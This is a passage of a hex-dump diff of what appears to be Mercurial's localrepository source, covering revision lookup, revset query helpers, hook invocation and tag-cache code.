+00011160: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
+00011170: 2020 2020 2020 6578 6365 7074 2028 496e        except (In
+00011180: 6465 7845 7272 6f72 2c20 4c6f 6f6b 7570  dexError, Lookup
+00011190: 4572 726f 7229 3a0a 2020 2020 2020 2020  Error):.        
+000111a0: 2020 2020 7261 6973 6520 6572 726f 722e      raise error.
+000111b0: 5265 706f 4c6f 6f6b 7570 4572 726f 7228  RepoLookupError(
 000111c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000111d0: 2020 2020 2023 0a20 2020 2020 2020 2020       #.         
-000111e0: 2020 2020 2020 2020 2020 2023 2058 5858             # XXX
-000111f0: 2077 6520 636f 756c 6420 6176 6f69 6420   we could avoid 
-00011200: 7468 6520 756e 6669 6c74 6572 6564 2069  the unfiltered i
-00011210: 6620 7765 2068 6164 2061 2072 6563 6f67  f we had a recog
-00011220: 6e69 7a61 626c 650a 2020 2020 2020 2020  nizable.        
-00011230: 2020 2020 2020 2020 2020 2020 2320 6578              # ex
-00011240: 6365 7074 696f 6e20 666f 7220 6669 6c74  ception for filt
-00011250: 6572 6564 2063 6861 6e67 6573 6574 2061  ered changeset a
-00011260: 6363 6573 730a 2020 2020 2020 2020 2020  ccess.          
-00011270: 2020 2020 2020 2020 2020 6966 2028 0a20            if (. 
-00011280: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00011290: 2020 2020 2020 2073 656c 662e 6c6f 6361         self.loca
-000112a0: 6c28 290a 2020 2020 2020 2020 2020 2020  l().            
-000112b0: 2020 2020 2020 2020 2020 2020 616e 6420              and 
-000112c0: 6368 616e 6765 6964 2069 6e20 7365 6c66  changeid in self
-000112d0: 2e75 6e66 696c 7465 7265 6428 292e 6469  .unfiltered().di
-000112e0: 7273 7461 7465 2e70 6172 656e 7473 2829  rstate.parents()
-000112f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00011300: 2020 2020 2029 3a0a 2020 2020 2020 2020       ):.        
-00011310: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00011320: 6d73 6720 3d20 5f28 6222 776f 726b 696e  msg = _(b"workin
-00011330: 6720 6469 7265 6374 6f72 7920 6861 7320  g directory has 
-00011340: 756e 6b6e 6f77 6e20 7061 7265 6e74 2027  unknown parent '
-00011350: 2573 2721 2229 0a20 2020 2020 2020 2020  %s'!").         
-00011360: 2020 2020 2020 2020 2020 2020 2020 2072                 r
-00011370: 6169 7365 2065 7272 6f72 2e41 626f 7274  aise error.Abort
-00011380: 286d 7367 2025 2073 686f 7274 2863 6861  (msg % short(cha
-00011390: 6e67 6569 6429 290a 2020 2020 2020 2020  ngeid)).        
-000113a0: 2020 2020 2020 2020 2020 2020 6368 616e              chan
-000113b0: 6765 6964 203d 2068 6578 2863 6861 6e67  geid = hex(chang
-000113c0: 6569 6429 2020 2320 666f 7220 7468 6520  eid)  # for the 
-000113d0: 6572 726f 7220 6d65 7373 6167 650a 2020  error message.  
-000113e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000113f0: 2020 7261 6973 650a 0a20 2020 2020 2020    raise..       
-00011400: 2020 2020 2065 6c69 6620 6c65 6e28 6368       elif len(ch
-00011410: 616e 6765 6964 2920 3d3d 2032 202a 2073  angeid) == 2 * s
-00011420: 656c 662e 6e6f 6465 636f 6e73 7461 6e74  elf.nodeconstant
-00011430: 732e 6e6f 6465 6c65 6e3a 0a20 2020 2020  s.nodelen:.     
-00011440: 2020 2020 2020 2020 2020 206e 6f64 6520             node 
-00011450: 3d20 6269 6e28 6368 616e 6765 6964 290a  = bin(changeid).
-00011460: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00011470: 7265 7620 3d20 7365 6c66 2e63 6861 6e67  rev = self.chang
-00011480: 656c 6f67 2e72 6576 286e 6f64 6529 0a20  elog.rev(node). 
-00011490: 2020 2020 2020 2020 2020 2065 6c73 653a             else:
-000114a0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000114b0: 2072 6169 7365 2065 7272 6f72 2e50 726f   raise error.Pro
-000114c0: 6772 616d 6d69 6e67 4572 726f 7228 0a20  grammingError(. 
-000114d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000114e0: 2020 2062 2275 6e73 7570 706f 7274 6564     b"unsupported
-000114f0: 2063 6861 6e67 6569 6420 2725 7327 206f   changeid '%s' o
-00011500: 6620 7479 7065 2025 7322 0a20 2020 2020  f type %s".     
-00011510: 2020 2020 2020 2020 2020 2020 2020 2025                 %
-00011520: 2028 6368 616e 6765 6964 2c20 7079 636f   (changeid, pyco
-00011530: 6d70 6174 2e62 7974 6573 7472 2874 7970  mpat.bytestr(typ
-00011540: 6528 6368 616e 6765 6964 2929 290a 2020  e(changeid))).  
-00011550: 2020 2020 2020 2020 2020 2020 2020 290a                ).
-00011560: 0a20 2020 2020 2020 2020 2020 2072 6574  .            ret
-00011570: 7572 6e20 636f 6e74 6578 742e 6368 616e  urn context.chan
-00011580: 6765 6374 7828 7365 6c66 2c20 7265 762c  gectx(self, rev,
-00011590: 206e 6f64 6529 0a0a 2020 2020 2020 2020   node)..        
-000115a0: 6578 6365 7074 2028 6572 726f 722e 4669  except (error.Fi
-000115b0: 6c74 6572 6564 496e 6465 7845 7272 6f72  lteredIndexError
-000115c0: 2c20 6572 726f 722e 4669 6c74 6572 6564  , error.Filtered
-000115d0: 4c6f 6f6b 7570 4572 726f 7229 3a0a 2020  LookupError):.  
-000115e0: 2020 2020 2020 2020 2020 7261 6973 6520            raise 
-000115f0: 6572 726f 722e 4669 6c74 6572 6564 5265  error.FilteredRe
-00011600: 706f 4c6f 6f6b 7570 4572 726f 7228 0a20  poLookupError(. 
-00011610: 2020 2020 2020 2020 2020 2020 2020 205f                 _
-00011620: 2862 2266 696c 7465 7265 6420 7265 7669  (b"filtered revi
-00011630: 7369 6f6e 2027 2573 2722 2920 2520 7079  sion '%s'") % py
-00011640: 636f 6d70 6174 2e62 7974 6573 7472 2863  compat.bytestr(c
-00011650: 6861 6e67 6569 6429 0a20 2020 2020 2020  hangeid).       
-00011660: 2020 2020 2029 0a20 2020 2020 2020 2065       ).        e
-00011670: 7863 6570 7420 2849 6e64 6578 4572 726f  xcept (IndexErro
-00011680: 722c 204c 6f6f 6b75 7045 7272 6f72 293a  r, LookupError):
-00011690: 0a20 2020 2020 2020 2020 2020 2072 6169  .            rai
-000116a0: 7365 2065 7272 6f72 2e52 6570 6f4c 6f6f  se error.RepoLoo
-000116b0: 6b75 7045 7272 6f72 280a 2020 2020 2020  kupError(.      
-000116c0: 2020 2020 2020 2020 2020 5f28 6222 756e            _(b"un
-000116d0: 6b6e 6f77 6e20 7265 7669 7369 6f6e 2027  known revision '
-000116e0: 2573 2722 2920 2520 7079 636f 6d70 6174  %s'") % pycompat
-000116f0: 2e62 7974 6573 7472 2863 6861 6e67 6569  .bytestr(changei
-00011700: 6429 0a20 2020 2020 2020 2020 2020 2029  d).            )
-00011710: 0a20 2020 2020 2020 2065 7863 6570 7420  .        except 
-00011720: 6572 726f 722e 5764 6972 556e 7375 7070  error.WdirUnsupp
-00011730: 6f72 7465 643a 0a20 2020 2020 2020 2020  orted:.         
-00011740: 2020 2072 6574 7572 6e20 636f 6e74 6578     return contex
-00011750: 742e 776f 726b 696e 6763 7478 2873 656c  t.workingctx(sel
-00011760: 6629 0a0a 2020 2020 6465 6620 5f5f 636f  f)..    def __co
-00011770: 6e74 6169 6e73 5f5f 2873 656c 662c 2063  ntains__(self, c
-00011780: 6861 6e67 6569 6429 3a0a 2020 2020 2020  hangeid):.      
-00011790: 2020 2222 2254 7275 6520 6966 2074 6865    """True if the
-000117a0: 2067 6976 656e 2063 6861 6e67 6569 6420   given changeid 
-000117b0: 6578 6973 7473 2222 220a 2020 2020 2020  exists""".      
-000117c0: 2020 7472 793a 0a20 2020 2020 2020 2020    try:.         
-000117d0: 2020 2073 656c 665b 6368 616e 6765 6964     self[changeid
-000117e0: 5d0a 2020 2020 2020 2020 2020 2020 7265  ].            re
-000117f0: 7475 726e 2054 7275 650a 2020 2020 2020  turn True.      
-00011800: 2020 6578 6365 7074 2065 7272 6f72 2e52    except error.R
-00011810: 6570 6f4c 6f6f 6b75 7045 7272 6f72 3a0a  epoLookupError:.
-00011820: 2020 2020 2020 2020 2020 2020 7265 7475              retu
-00011830: 726e 2046 616c 7365 0a0a 2020 2020 6465  rn False..    de
-00011840: 6620 5f5f 6e6f 6e7a 6572 6f5f 5f28 7365  f __nonzero__(se
-00011850: 6c66 293a 0a20 2020 2020 2020 2072 6574  lf):.        ret
-00011860: 7572 6e20 5472 7565 0a0a 2020 2020 5f5f  urn True..    __
-00011870: 626f 6f6c 5f5f 203d 205f 5f6e 6f6e 7a65  bool__ = __nonze
-00011880: 726f 5f5f 0a0a 2020 2020 6465 6620 5f5f  ro__..    def __
-00011890: 6c65 6e5f 5f28 7365 6c66 293a 0a20 2020  len__(self):.   
-000118a0: 2020 2020 2023 206e 6f20 6e65 6564 2074       # no need t
-000118b0: 6f20 7061 7920 7468 6520 636f 7374 206f  o pay the cost o
-000118c0: 6620 7265 706f 7669 6577 2e63 6861 6e67  f repoview.chang
-000118d0: 656c 6f67 0a20 2020 2020 2020 2075 6e66  elog.        unf
-000118e0: 6920 3d20 7365 6c66 2e75 6e66 696c 7465  i = self.unfilte
-000118f0: 7265 6428 290a 2020 2020 2020 2020 7265  red().        re
-00011900: 7475 726e 206c 656e 2875 6e66 692e 6368  turn len(unfi.ch
-00011910: 616e 6765 6c6f 6729 0a0a 2020 2020 6465  angelog)..    de
-00011920: 6620 5f5f 6974 6572 5f5f 2873 656c 6629  f __iter__(self)
-00011930: 3a0a 2020 2020 2020 2020 7265 7475 726e  :.        return
-00011940: 2069 7465 7228 7365 6c66 2e63 6861 6e67   iter(self.chang
-00011950: 656c 6f67 290a 0a20 2020 2064 6566 2072  elog)..    def r
-00011960: 6576 7328 7365 6c66 2c20 6578 7072 3a20  evs(self, expr: 
-00011970: 6279 7465 732c 202a 6172 6773 293a 0a20  bytes, *args):. 
-00011980: 2020 2020 2020 2022 2222 4669 6e64 2072         """Find r
-00011990: 6576 6973 696f 6e73 206d 6174 6368 696e  evisions matchin
-000119a0: 6720 6120 7265 7673 6574 2e0a 0a20 2020  g a revset...   
-000119b0: 2020 2020 2054 6865 2072 6576 7365 7420       The revset 
-000119c0: 6973 2073 7065 6369 6669 6564 2061 7320  is specified as 
-000119d0: 6120 7374 7269 6e67 2060 6065 7870 7260  a string ``expr`
-000119e0: 6020 7468 6174 206d 6179 2063 6f6e 7461  ` that may conta
-000119f0: 696e 0a20 2020 2020 2020 2025 2d66 6f72  in.        %-for
-00011a00: 6d61 7474 696e 6720 746f 2065 7363 6170  matting to escap
-00011a10: 6520 6365 7274 6169 6e20 7479 7065 732e  e certain types.
-00011a20: 2053 6565 2060 6072 6576 7365 746c 616e   See ``revsetlan
-00011a30: 672e 666f 726d 6174 7370 6563 6060 2e0a  g.formatspec``..
-00011a40: 0a20 2020 2020 2020 2052 6576 7365 7420  .        Revset 
-00011a50: 616c 6961 7365 7320 6672 6f6d 2074 6865  aliases from the
-00011a60: 2063 6f6e 6669 6775 7261 7469 6f6e 2061   configuration a
-00011a70: 7265 206e 6f74 2065 7870 616e 6465 642e  re not expanded.
-00011a80: 2054 6f20 6578 7061 6e64 0a20 2020 2020   To expand.     
-00011a90: 2020 2075 7365 7220 616c 6961 7365 732c     user aliases,
-00011aa0: 2063 6f6e 7369 6465 7220 6361 6c6c 696e   consider callin
-00011ab0: 6720 6060 7363 6d75 7469 6c2e 7265 7672  g ``scmutil.revr
-00011ac0: 616e 6765 2829 6060 206f 720a 2020 2020  ange()`` or.    
-00011ad0: 2020 2020 6060 7265 706f 2e61 6e79 7265      ``repo.anyre
-00011ae0: 7673 285b 6578 7072 5d2c 2075 7365 723d  vs([expr], user=
-00011af0: 5472 7565 2960 602e 0a0a 2020 2020 2020  True)``...      
-00011b00: 2020 5265 7475 726e 7320 6120 736d 6172    Returns a smar
-00011b10: 7473 6574 2e61 6273 7472 6163 7473 6d61  tset.abstractsma
-00011b20: 7274 7365 742c 2077 6869 6368 2069 7320  rtset, which is 
-00011b30: 6120 6c69 7374 2d6c 696b 6520 696e 7465  a list-like inte
-00011b40: 7266 6163 650a 2020 2020 2020 2020 7468  rface.        th
-00011b50: 6174 2063 6f6e 7461 696e 7320 696e 7465  at contains inte
-00011b60: 6765 7220 7265 7669 7369 6f6e 732e 0a20  ger revisions.. 
-00011b70: 2020 2020 2020 2022 2222 0a20 2020 2020         """.     
-00011b80: 2020 2074 7265 6520 3d20 7265 7673 6574     tree = revset
-00011b90: 6c61 6e67 2e73 7065 6374 7265 6528 6578  lang.spectree(ex
-00011ba0: 7072 2c20 2a61 7267 7329 0a20 2020 2020  pr, *args).     
-00011bb0: 2020 2072 6574 7572 6e20 7265 7673 6574     return revset
-00011bc0: 2e6d 616b 656d 6174 6368 6572 2874 7265  .makematcher(tre
-00011bd0: 6529 2873 656c 6629 0a0a 2020 2020 6465  e)(self)..    de
-00011be0: 6620 7365 7428 7365 6c66 2c20 6578 7072  f set(self, expr
-00011bf0: 3a20 6279 7465 732c 202a 6172 6773 293a  : bytes, *args):
-00011c00: 0a20 2020 2020 2020 2022 2222 4669 6e64  .        """Find
-00011c10: 2072 6576 6973 696f 6e73 206d 6174 6368   revisions match
-00011c20: 696e 6720 6120 7265 7673 6574 2061 6e64  ing a revset and
-00011c30: 2065 6d69 7420 6368 616e 6765 6374 7820   emit changectx 
-00011c40: 696e 7374 616e 6365 732e 0a0a 2020 2020  instances...    
-00011c50: 2020 2020 5468 6973 2069 7320 6120 636f      This is a co
-00011c60: 6e76 656e 6965 6e63 6520 7772 6170 7065  nvenience wrappe
-00011c70: 7220 6172 6f75 6e64 2060 6072 6576 7328  r around ``revs(
-00011c80: 2960 6020 7468 6174 2069 7465 7261 7465  )`` that iterate
-00011c90: 7320 7468 650a 2020 2020 2020 2020 7265  s the.        re
-00011ca0: 7375 6c74 2061 6e64 2069 7320 6120 6765  sult and is a ge
-00011cb0: 6e65 7261 746f 7220 6f66 2063 6861 6e67  nerator of chang
-00011cc0: 6563 7478 2069 6e73 7461 6e63 6573 2e0a  ectx instances..
-00011cd0: 0a20 2020 2020 2020 2052 6576 7365 7420  .        Revset 
-00011ce0: 616c 6961 7365 7320 6672 6f6d 2074 6865  aliases from the
-00011cf0: 2063 6f6e 6669 6775 7261 7469 6f6e 2061   configuration a
-00011d00: 7265 206e 6f74 2065 7870 616e 6465 642e  re not expanded.
-00011d10: 2054 6f20 6578 7061 6e64 0a20 2020 2020   To expand.     
-00011d20: 2020 2075 7365 7220 616c 6961 7365 732c     user aliases,
-00011d30: 2063 6f6e 7369 6465 7220 6361 6c6c 696e   consider callin
-00011d40: 6720 6060 7363 6d75 7469 6c2e 7265 7672  g ``scmutil.revr
-00011d50: 616e 6765 2829 6060 2e0a 2020 2020 2020  ange()``..      
-00011d60: 2020 2222 220a 2020 2020 2020 2020 666f    """.        fo
-00011d70: 7220 7220 696e 2073 656c 662e 7265 7673  r r in self.revs
-00011d80: 2865 7870 722c 202a 6172 6773 293a 0a20  (expr, *args):. 
-00011d90: 2020 2020 2020 2020 2020 2079 6965 6c64             yield
-00011da0: 2073 656c 665b 725d 0a0a 2020 2020 6465   self[r]..    de
-00011db0: 6620 616e 7972 6576 7328 7365 6c66 2c20  f anyrevs(self, 
-00011dc0: 7370 6563 733a 2062 7974 6573 2c20 7573  specs: bytes, us
-00011dd0: 6572 3d46 616c 7365 2c20 6c6f 6361 6c61  er=False, locala
-00011de0: 6c69 6173 3d4e 6f6e 6529 3a0a 2020 2020  lias=None):.    
-00011df0: 2020 2020 2222 2246 696e 6420 7265 7669      """Find revi
-00011e00: 7369 6f6e 7320 6d61 7463 6869 6e67 206f  sions matching o
-00011e10: 6e65 206f 6620 7468 6520 6769 7665 6e20  ne of the given 
-00011e20: 7265 7673 6574 732e 0a0a 2020 2020 2020  revsets...      
-00011e30: 2020 5265 7673 6574 2061 6c69 6173 6573    Revset aliases
-00011e40: 2066 726f 6d20 7468 6520 636f 6e66 6967   from the config
-00011e50: 7572 6174 696f 6e20 6172 6520 6e6f 7420  uration are not 
-00011e60: 6578 7061 6e64 6564 2062 7920 6465 6661  expanded by defa
-00011e70: 756c 742e 2054 6f0a 2020 2020 2020 2020  ult. To.        
-00011e80: 6578 7061 6e64 2075 7365 7220 616c 6961  expand user alia
-00011e90: 7365 732c 2073 7065 6369 6679 2060 6075  ses, specify ``u
-00011ea0: 7365 723d 5472 7565 6060 2e20 546f 2070  ser=True``. To p
-00011eb0: 726f 7669 6465 2073 6f6d 6520 6c6f 6361  rovide some loca
-00011ec0: 6c0a 2020 2020 2020 2020 6465 6669 6e69  l.        defini
-00011ed0: 7469 6f6e 7320 6f76 6572 7269 6469 6e67  tions overriding
-00011ee0: 2075 7365 7220 616c 6961 7365 732c 2073   user aliases, s
-00011ef0: 6574 2060 606c 6f63 616c 616c 6961 7360  et ``localalias`
-00011f00: 6020 746f 0a20 2020 2020 2020 2060 607b  ` to.        ``{
-00011f10: 6e61 6d65 3a20 6465 6669 6e69 7469 6f6e  name: definition
-00011f20: 7374 7269 6e67 7d60 602e 0a20 2020 2020  string}``..     
-00011f30: 2020 2022 2222 0a20 2020 2020 2020 2069     """.        i
-00011f40: 6620 7370 6563 7320 3d3d 205b 6227 6e75  f specs == [b'nu
-00011f50: 6c6c 275d 3a0a 2020 2020 2020 2020 2020  ll']:.          
-00011f60: 2020 7265 7475 726e 2072 6576 7365 742e    return revset.
-00011f70: 6261 7365 7365 7428 5b6e 756c 6c72 6576  baseset([nullrev
-00011f80: 5d29 0a20 2020 2020 2020 2069 6620 7370  ]).        if sp
-00011f90: 6563 7320 3d3d 205b 6227 2e27 5d3a 0a20  ecs == [b'.']:. 
-00011fa0: 2020 2020 2020 2020 2020 2071 7569 636b             quick
-00011fb0: 5f64 6174 6120 3d20 7365 6c66 2e5f 7175  _data = self._qu
-00011fc0: 6963 6b5f 6163 6365 7373 5f63 6861 6e67  ick_access_chang
-00011fd0: 6569 642e 6765 7428 6227 2e27 290a 2020  eid.get(b'.').  
-00011fe0: 2020 2020 2020 2020 2020 6966 2071 7569            if qui
-00011ff0: 636b 5f64 6174 6120 6973 206e 6f74 204e  ck_data is not N
-00012000: 6f6e 653a 0a20 2020 2020 2020 2020 2020  one:.           
-00012010: 2020 2020 2072 6574 7572 6e20 7265 7673       return revs
-00012020: 6574 2e62 6173 6573 6574 285b 7175 6963  et.baseset([quic
-00012030: 6b5f 6461 7461 5b30 5d5d 290a 2020 2020  k_data[0]]).    
-00012040: 2020 2020 6966 2075 7365 723a 0a20 2020      if user:.   
-00012050: 2020 2020 2020 2020 206d 203d 2072 6576           m = rev
-00012060: 7365 742e 6d61 7463 6861 6e79 280a 2020  set.matchany(.  
-00012070: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00012080: 6c66 2e75 692c 0a20 2020 2020 2020 2020  lf.ui,.         
-00012090: 2020 2020 2020 2073 7065 6373 2c0a 2020         specs,.  
-000120a0: 2020 2020 2020 2020 2020 2020 2020 6c6f                lo
-000120b0: 6f6b 7570 3d72 6576 7365 742e 6c6f 6f6b  okup=revset.look
-000120c0: 7570 666e 2873 656c 6629 2c0a 2020 2020  upfn(self),.    
-000120d0: 2020 2020 2020 2020 2020 2020 6c6f 6361              loca
-000120e0: 6c61 6c69 6173 3d6c 6f63 616c 616c 6961  lalias=localalia
-000120f0: 732c 0a20 2020 2020 2020 2020 2020 2029  s,.            )
-00012100: 0a20 2020 2020 2020 2065 6c73 653a 0a20  .        else:. 
-00012110: 2020 2020 2020 2020 2020 206d 203d 2072             m = r
-00012120: 6576 7365 742e 6d61 7463 6861 6e79 284e  evset.matchany(N
-00012130: 6f6e 652c 2073 7065 6373 2c20 6c6f 6361  one, specs, loca
-00012140: 6c61 6c69 6173 3d6c 6f63 616c 616c 6961  lalias=localalia
-00012150: 7329 0a20 2020 2020 2020 2072 6574 7572  s).        retur
-00012160: 6e20 6d28 7365 6c66 290a 0a20 2020 2064  n m(self)..    d
-00012170: 6566 2075 726c 2873 656c 6629 202d 3e20  ef url(self) -> 
-00012180: 6279 7465 733a 0a20 2020 2020 2020 2072  bytes:.        r
-00012190: 6574 7572 6e20 6227 6669 6c65 3a27 202b  eturn b'file:' +
-000121a0: 2073 656c 662e 726f 6f74 0a0a 2020 2020   self.root..    
-000121b0: 6465 6620 686f 6f6b 2873 656c 662c 206e  def hook(self, n
-000121c0: 616d 652c 2074 6872 6f77 3d46 616c 7365  ame, throw=False
-000121d0: 2c20 2a2a 6172 6773 293a 0a20 2020 2020  , **args):.     
-000121e0: 2020 2022 2222 4361 6c6c 2061 2068 6f6f     """Call a hoo
-000121f0: 6b2c 2070 6173 7369 6e67 2074 6869 7320  k, passing this 
-00012200: 7265 706f 2069 6e73 7461 6e63 652e 0a0a  repo instance...
-00012210: 2020 2020 2020 2020 5468 6973 2061 2063          This a c
-00012220: 6f6e 7665 6e69 656e 6365 206d 6574 686f  onvenience metho
-00012230: 6420 746f 2061 6964 2069 6e76 6f6b 696e  d to aid invokin
-00012240: 6720 686f 6f6b 732e 2045 7874 656e 7369  g hooks. Extensi
-00012250: 6f6e 7320 6c69 6b65 6c79 0a20 2020 2020  ons likely.     
-00012260: 2020 2077 6f6e 2774 2063 616c 6c20 7468     won't call th
-00012270: 6973 2075 6e6c 6573 7320 7468 6579 2068  is unless they h
-00012280: 6176 6520 7265 6769 7374 6572 6564 2061  ave registered a
-00012290: 2063 7573 746f 6d20 686f 6f6b 206f 7220   custom hook or 
-000122a0: 6172 650a 2020 2020 2020 2020 7265 706c  are.        repl
-000122b0: 6163 696e 6720 636f 6465 2074 6861 7420  acing code that 
-000122c0: 6973 2065 7870 6563 7465 6420 746f 2063  is expected to c
-000122d0: 616c 6c20 6120 686f 6f6b 2e0a 2020 2020  all a hook..    
-000122e0: 2020 2020 2222 220a 2020 2020 2020 2020      """.        
-000122f0: 7265 7475 726e 2068 6f6f 6b2e 686f 6f6b  return hook.hook
-00012300: 2873 656c 662e 7569 2c20 7365 6c66 2c20  (self.ui, self, 
-00012310: 6e61 6d65 2c20 7468 726f 772c 202a 2a61  name, throw, **a
-00012320: 7267 7329 0a0a 2020 2020 4066 696c 7465  rgs)..    @filte
-00012330: 7265 6470 726f 7065 7274 7963 6163 6865  redpropertycache
-00012340: 0a20 2020 2064 6566 205f 7461 6773 6361  .    def _tagsca
-00012350: 6368 6528 7365 6c66 293a 0a20 2020 2020  che(self):.     
-00012360: 2020 2022 2222 5265 7475 726e 7320 6120     """Returns a 
-00012370: 7461 6773 6361 6368 6520 6f62 6a65 6374  tagscache object
-00012380: 2074 6861 7420 636f 6e74 6169 6e73 2076   that contains v
-00012390: 6172 696f 7573 2074 6167 7320 7265 6c61  arious tags rela
-000123a0: 7465 640a 2020 2020 2020 2020 6361 6368  ted.        cach
-000123b0: 6573 2e22 2222 0a0a 2020 2020 2020 2020  es."""..        
-000123c0: 2320 5468 6973 2073 696d 706c 6966 6965  # This simplifie
-000123d0: 7320 6974 7320 6361 6368 6520 6d61 6e61  s its cache mana
-000123e0: 6765 6d65 6e74 2062 7920 6861 7669 6e67  gement by having
-000123f0: 206f 6e65 2064 6563 6f72 6174 6564 0a20   one decorated. 
-00012400: 2020 2020 2020 2023 2066 756e 6374 696f         # functio
-00012410: 6e20 2874 6869 7320 6f6e 6529 2061 6e64  n (this one) and
-00012420: 2074 6865 2072 6573 7420 7369 6d70 6c79   the rest simply
-00012430: 2066 6574 6368 2074 6869 6e67 7320 6672   fetch things fr
-00012440: 6f6d 2069 742e 0a20 2020 2020 2020 2063  om it..        c
-00012450: 6c61 7373 2074 6167 7363 6163 6865 3a0a  lass tagscache:.
-00012460: 2020 2020 2020 2020 2020 2020 6465 6620              def 
-00012470: 5f5f 696e 6974 5f5f 2873 656c 6629 3a0a  __init__(self):.
-00012480: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00012490: 2320 5468 6573 6520 7477 6f20 6465 6669  # These two defi
-000124a0: 6e65 2074 6865 2073 6574 206f 6620 7461  ne the set of ta
-000124b0: 6773 2066 6f72 2074 6869 7320 7265 706f  gs for this repo
-000124c0: 7369 746f 7279 2e20 7461 6773 0a20 2020  sitory. tags.   
-000124d0: 2020 2020 2020 2020 2020 2020 2023 206d               # m
-000124e0: 6170 7320 7461 6720 6e61 6d65 2074 6f20  aps tag name to 
-000124f0: 6e6f 6465 3b20 7461 6774 7970 6573 206d  node; tagtypes m
-00012500: 6170 7320 7461 6720 6e61 6d65 2074 6f20  aps tag name to 
-00012510: 2767 6c6f 6261 6c27 206f 720a 2020 2020  'global' or.    
-00012520: 2020 2020 2020 2020 2020 2020 2320 276c              # 'l
-00012530: 6f63 616c 272e 2028 476c 6f62 616c 2074  ocal'. (Global t
-00012540: 6167 7320 6172 6520 6465 6669 6e65 6420  ags are defined 
-00012550: 6279 202e 6867 7461 6773 2061 6372 6f73  by .hgtags acros
-00012560: 7320 616c 6c0a 2020 2020 2020 2020 2020  s all.          
-00012570: 2020 2020 2020 2320 6865 6164 732c 2061        # heads, a
-00012580: 6e64 206c 6f63 616c 2074 6167 7320 6172  nd local tags ar
-00012590: 6520 6465 6669 6e65 6420 696e 202e 6867  e defined in .hg
-000125a0: 2f6c 6f63 616c 7461 6773 2e29 0a20 2020  /localtags.).   
-000125b0: 2020 2020 2020 2020 2020 2020 2023 2054               # T
-000125c0: 6865 7920 636f 6e73 7469 7475 7465 2074  hey constitute t
-000125d0: 6865 2069 6e2d 6d65 6d6f 7279 2063 6163  he in-memory cac
-000125e0: 6865 206f 6620 7461 6773 2e0a 2020 2020  he of tags..    
-000125f0: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-00012600: 2e74 6167 7320 3d20 7365 6c66 2e74 6167  .tags = self.tag
-00012610: 7479 7065 7320 3d20 4e6f 6e65 0a0a 2020  types = None..  
-00012620: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00012630: 6c66 2e6e 6f64 6574 6167 7363 6163 6865  lf.nodetagscache
-00012640: 203d 2073 656c 662e 7461 6773 6c69 7374   = self.tagslist
-00012650: 203d 204e 6f6e 650a 0a20 2020 2020 2020   = None..       
-00012660: 2063 6163 6865 203d 2074 6167 7363 6163   cache = tagscac
-00012670: 6865 2829 0a20 2020 2020 2020 2063 6163  he().        cac
-00012680: 6865 2e74 6167 732c 2063 6163 6865 2e74  he.tags, cache.t
-00012690: 6167 7479 7065 7320 3d20 7365 6c66 2e5f  agtypes = self._
-000126a0: 6669 6e64 7461 6773 2829 0a0a 2020 2020  findtags()..    
-000126b0: 2020 2020 7265 7475 726e 2063 6163 6865      return cache
-000126c0: 0a0a 2020 2020 6465 6620 7461 6773 2873  ..    def tags(s
-000126d0: 656c 6629 3a0a 2020 2020 2020 2020 2727  elf):.        ''
-000126e0: 2772 6574 7572 6e20 6120 6d61 7070 696e  'return a mappin
-000126f0: 6720 6f66 2074 6167 2074 6f20 6e6f 6465  g of tag to node
-00012700: 2727 270a 2020 2020 2020 2020 7420 3d20  '''.        t = 
-00012710: 7b7d 0a20 2020 2020 2020 2069 6620 7365  {}.        if se
-00012720: 6c66 2e63 6861 6e67 656c 6f67 2e66 696c  lf.changelog.fil
-00012730: 7465 7265 6472 6576 733a 0a20 2020 2020  teredrevs:.     
-00012740: 2020 2020 2020 2074 6167 732c 2074 7420         tags, tt 
-00012750: 3d20 7365 6c66 2e5f 6669 6e64 7461 6773  = self._findtags
-00012760: 2829 0a20 2020 2020 2020 2065 6c73 653a  ().        else:
-00012770: 0a20 2020 2020 2020 2020 2020 2074 6167  .            tag
-00012780: 7320 3d20 7365 6c66 2e5f 7461 6773 6361  s = self._tagsca
-00012790: 6368 652e 7461 6773 0a20 2020 2020 2020  che.tags.       
-000127a0: 2072 6576 203d 2073 656c 662e 6368 616e   rev = self.chan
-000127b0: 6765 6c6f 672e 7265 760a 2020 2020 2020  gelog.rev.      
-000127c0: 2020 666f 7220 6b2c 2076 2069 6e20 7461    for k, v in ta
-000127d0: 6773 2e69 7465 6d73 2829 3a0a 2020 2020  gs.items():.    
-000127e0: 2020 2020 2020 2020 7472 793a 0a20 2020          try:.   
-000127f0: 2020 2020 2020 2020 2020 2020 2023 2069               # i
-00012800: 676e 6f72 6520 7461 6773 2074 6f20 756e  gnore tags to un
-00012810: 6b6e 6f77 6e20 6e6f 6465 730a 2020 2020  known nodes.    
-00012820: 2020 2020 2020 2020 2020 2020 7265 7628              rev(
-00012830: 7629 0a20 2020 2020 2020 2020 2020 2020  v).             
-00012840: 2020 2074 5b6b 5d20 3d20 760a 2020 2020     t[k] = v.    
-00012850: 2020 2020 2020 2020 6578 6365 7074 2028          except (
-00012860: 6572 726f 722e 4c6f 6f6b 7570 4572 726f  error.LookupErro
-00012870: 722c 2056 616c 7565 4572 726f 7229 3a0a  r, ValueError):.
-00012880: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00012890: 7061 7373 0a20 2020 2020 2020 2072 6574  pass.        ret
-000128a0: 7572 6e20 740a 0a20 2020 2064 6566 205f  urn t..    def _
-000128b0: 6669 6e64 7461 6773 2873 656c 6629 3a0a  findtags(self):.
-000128c0: 2020 2020 2020 2020 2222 2244 6f20 7468          """Do th
-000128d0: 6520 6861 7264 2077 6f72 6b20 6f66 2066  e hard work of f
-000128e0: 696e 6469 6e67 2074 6167 732e 2020 5265  inding tags.  Re
-000128f0: 7475 726e 2061 2070 6169 7220 6f66 2064  turn a pair of d
-00012900: 6963 7473 0a20 2020 2020 2020 2028 7461  icts.        (ta
